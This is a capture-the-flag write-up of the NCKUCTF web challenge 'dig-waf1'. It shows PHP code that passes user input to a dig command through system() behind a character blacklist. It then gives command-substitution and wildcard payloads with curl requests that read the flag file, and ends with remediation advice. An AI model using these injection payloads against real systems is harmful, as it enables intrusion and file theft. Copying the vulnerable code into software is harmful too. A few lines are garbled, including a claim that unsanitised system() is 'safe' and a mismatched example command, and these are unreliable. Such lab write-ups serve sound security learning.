---
title: "dig-waf1"
date: 2026-04-26
categories:
  - Web
tags:
  - Web
  - NCKUCTF
collections:
  - NCKUCTF
---



{{< admonition tldr "TL;DR" >}}

**dig-waf1** is a web challenge from **NCKUCTF**. * **Challenge Name** : dig-waf1 * **Category** : WEB * **Organizer** : NCKUCTF * **Writeup Author** : spawn2pwn

{{< /admonition >}}

## **1. Identity Challenge**

* **Challenge Name** : dig-waf1
* **Category** : WEB
* **Organizer** : NCKUCTF
* **Writeup Writer** : spawn2pwn

---

## **2. Problem Description**

This challenge provides an input form that is used to perform a DNS lookup using the command `dig` .

The user is asked to enter the domain, then the server will execute the command and display the results.

However, this challenge is equipped with a simple filtering mechanism (WAF) which aims to prevent exploitation.

Main goals:

> **Obtain FLAG by exploiting weaknesses in the system even though there is a WAF**

---

## **3. System Analysis**

Main source code snippet:

```php
$blacklist = ['|', '&', ';', '>', '<', "
", 'flag'];

$is_bad = false;
foreach ($blacklist as $bad_word)
    if (strpos($_POST['name'], $bad_word) !== false)
        $is_bad = true;

if ($is_bad)
    echo "BAD HACKER!!!";
else
    system("dig '" . $_POST['name'] . "';");
```

### Mechanism:

1. User sends input via POST parameter `name` 2. Input is checked using blacklist
3. If it contains certain characters → rejected
4. If passed → enter into command:

```bash
dig '<input>';
```

5. Command is executed using `system()` ---

## **4. Identify Vulnerabilities**

The primary vulnerability:

> **Command Injection (with WAF bypass)**

### Cause:

* User input is entered directly into the command shell
* Using `system()` without sanitization is safe
* Filtering only uses blacklist (not complete)

### Blacklist:

```php
['|', '&', ';', '>', '<', "
", 'flag']
```

### Weaknesses of Blacklist:

* Non-blocking:

  * `$()` (command substitution)
* Does not block wildcards ( `*` )
* Does not block commands such as `cat` , `ls` , etc.

---

## **5. Exploitation Methodology**

### **5.1 Bypass WAF with Command Substitution**

Payloads:

```bash
'$(whoami)'
```

Request:

```bash
curl -X POST "https://chall.nckuctf.org:28114/" \
-d "name='\$(whoami)'"
```

### Explanation:

| Section | Function |
| ----------- | ----------------------------------------------- |
| `'` | Remains in the string context |
| `$(whoami)` | Executed by shell (command substitution) |

Command formed:

```bash
dig ''$(ls /)'';
```

However the shell will evaluate `$()` first:

```bash
dig 'www-data';
```

### Output:

```
<<>> DiG ... <<>> www-data
```

Showing that:

> Command injection was successful and runs as user `www-data` ---

### **5.2 System Enumeration**

View the contents of the root directory:

```bash
'$(ls /)'
```

Request:

```bash
curl -X POST "https://chall.nckuctf.org:28114/" \
-d "name='\$(ls /)'"
```

### Important output:

```
bin boot dev etc flag_o2837ry home lib ...
```

Found files:

```
flag_o2837ry
```

---

### **5.3 Bypass Filter Word "flag"**

Blacklist blocking string:

```php
'flag'
```

However it can be bypassed using wildcards:

```bash
/fla*
```

---

### **5.4 Reading Flag Files**

Payloads:

```bash
'$(cat /fla*)'
```

---

### **5.5 Flag Extraction**

```bash
curl -X POST "https://chall.nckuctf.org:28114/" \
-d "name='\$(cat /fla*)'" \
| grep -o "NCKUCTF{.*}"
```

---

## **6. Exploitation Results**

FLAG was successfully obtained:

```
NCKUCTF{d19_70015_15_427!}
```

---

## **7. Discussion**

The primary system vulnerabilities:

### **1. Use of system() without sanitization**

```php
system("dig '" . $_POST['name'] . "';");
```

---

### **2. Blacklisting is not effective**

Problem:

* Does not block `$()` (command substitution)
* Does not block wildcards ( `*` )
* Easy to bypass

---

### **3. Reliance on string-based filtering**

```php
strpos(...)
```

This approach is weak because:

* Doesn't understand shell context
* Easy to evade by attackers

---

### Impact:

Attackers can:

* Execute system commands
* Perform file enumeration
* Reading sensitive files (FLAG)

---

## **8. Improvement Recommendations**

### **1. Use escapeshellarg()**

```php
system("dig " . escapeshellarg($_POST['name']));
```

---

### **2. Avoid blacklists, use whitelists**

```php
if (!filter_var($_POST['name'], FILTER_VALIDATE_DOMAIN)) {
    die("Invalid domain");
}
```

---

### **3. Avoid system()**

Use safer alternatives:

```php
exec("dig " . escapeshellarg($domain), $output);
```

or use the DNS resolver library.

---

### **4. Disable command substitution**

Make sure the shell does not evaluate user input directly.

---

## **9. Conclusion**

This challenge shows that:

> **A simple blacklist is not enough to prevent command injection**

Even though malicious characters such as `;` , `|` , and `&` are blocked, attackers can still:

* Uses `$()` for command execution
* Using wildcards to bypass filters
* Exploit the system to get FLAG

---

## **10. Attachments**

### **Source Code**

```php
system("dig '" . $_POST['name'] . "';");
```

---

### **Payload Exploit**

```bash
'$(cat /fla*)'
```

---

### **Request**

```bash
curl -X POST "https://chall.nckuctf.org:28114/" \
-d "name='\$(cat /fla*)'"
```

---

### **Flag Extraction**

```bash
curl -X POST "https://chall.nckuctf.org:28114/" \
-d "name='\$(cat /fla*)'" \
| grep -o "NCKUCTF{.*}"
```
